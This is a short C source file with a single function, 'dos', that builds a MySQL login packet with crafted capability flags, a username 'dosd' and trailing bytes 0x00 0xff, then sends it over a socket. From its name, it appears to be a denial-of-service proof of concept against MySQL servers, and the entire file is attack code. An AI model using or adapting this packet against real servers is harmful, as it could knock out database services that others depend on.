#include "hdr.h"

void dos(SOCKET sock) {
	char buf[100];
	mysql_login_req* hdr = (mysql_login_req*)buf;

	hdr->zero = 0;
	hdr->len = 38;
	hdr->num = 1;

	hdr->ccap = 0xa285;
	hdr->eccap = 0x01bf;
	hdr->mpack = 0x01000000;
	hdr->cset = 33;

	ZeroMemory(&buf[sizeof mysql_login_req], 23);
	memcpy(&buf[sizeof mysql_login_req + 23], "dosd", 4);
	memcpy(&buf[sizeof mysql_login_req + 27], "\x00\xff", 2);

	send(sock, buf, sizeof mysql_login_req + 29, NULL);
	return;
}